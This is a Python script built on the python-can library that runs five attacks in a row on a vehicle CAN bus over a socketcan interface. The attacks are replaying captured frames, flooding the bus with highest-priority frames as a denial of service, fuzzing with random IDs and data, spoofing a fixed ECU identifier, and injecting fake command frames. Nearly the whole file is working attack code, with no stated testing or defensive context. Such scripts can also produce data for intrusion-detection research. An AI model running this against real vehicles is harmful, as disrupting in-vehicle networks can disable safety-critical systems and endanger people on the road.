import can
import time
import random

def replay_attack(bus, recorded_messages, duration):
    start = time.time()
    while time.time() - start < duration:
        for msg in recorded_messages:
            bus.send(msg)
            time.sleep(0.01)

def dos_attack(bus, duration):
    msg = can.Message(arbitration_id=0x000, data=[0xFF]*8, is_extended_id=False)
    start = time.time()
    while time.time() - start < duration:
        try:
            bus.send(msg)
        except:
            pass

def fuzzy_attack(bus, duration):
    start = time.time()
    while time.time() - start < duration:
        msg = can.Message(
            arbitration_id=random.randint(0x000, 0x7FF),
            data=[random.randint(0x00, 0xFF) for _ in range(8)],
            is_extended_id=False
        )
        try:
            bus.send(msg)
            time.sleep(0.005)
        except:
            pass

def spoofing_attack(bus, duration):
    # Change ECU ID to a valid one from vehicle spy
    spoofed_id = 0x123  
    spoofed_data = [0x01, 0x02, 0x03, 0x04, 0xA5, 0xA5, 0xA5, 0xA5]
    msg = can.Message(arbitration_id=spoofed_id, data=spoofed_data, is_extended_id=False)

    start = time.time()
    while time.time() - start < duration:
        bus.send(msg)
        time.sleep(0.01)

def injection_attack(bus, duration):
    fake_commands = [
        can.Message(arbitration_id=0x321, data=[0xAA, 0xBB, 0xCC, 0xDD, 0x00, 0x00, 0x00, 0x00], is_extended_id=False),
        can.Message(arbitration_id=0x400, data=[0x10, 0x20, 0x30, 0x40, 0xFF, 0xFF, 0x00, 0x00], is_extended_id=False)
    ]

    start = time.time()
    while time.time() - start < duration:
        for msg in fake_commands:
            bus.send(msg)
            time.sleep(0.02)

def capture_messages(bus, duration=2):
    captured = []
    start = time.time()
    while time.time() - start < duration:
        msg = bus.recv(timeout=1)
        if msg:
            captured.append(msg)
    return captured

def main():
    INTERFACE = 'can0'    
    BUSTYPE = 'socketcan'

    bus = can.interface.Bus(channel=INTERFACE, bustype=BUSTYPE)
    recorded_messages = capture_messages(bus, duration=2)

    attacks = [
        ("Replay Attack", replay_attack, recorded_messages),
        ("DoS Attack", dos_attack, None),
        ("Fuzzy Attack", fuzzy_attack, None),
        ("Spoofing Attack", spoofing_attack, None),
        ("Injection Attack", injection_attack, None),
    ]

    duration_per_attack = 30 

    for name, attack_fn, arg in attacks:
        print(f"\n=== STARTING: {name} ===")
        if arg:
            attack_fn(bus, arg, duration_per_attack)
        else:
            attack_fn(bus, duration_per_attack)
        print(f"=== FINISHED: {name} ===\n")
        time.sleep(3)

    print("[DONE] All attacks have been executed.")

if __name__ == "__main__":
    main()
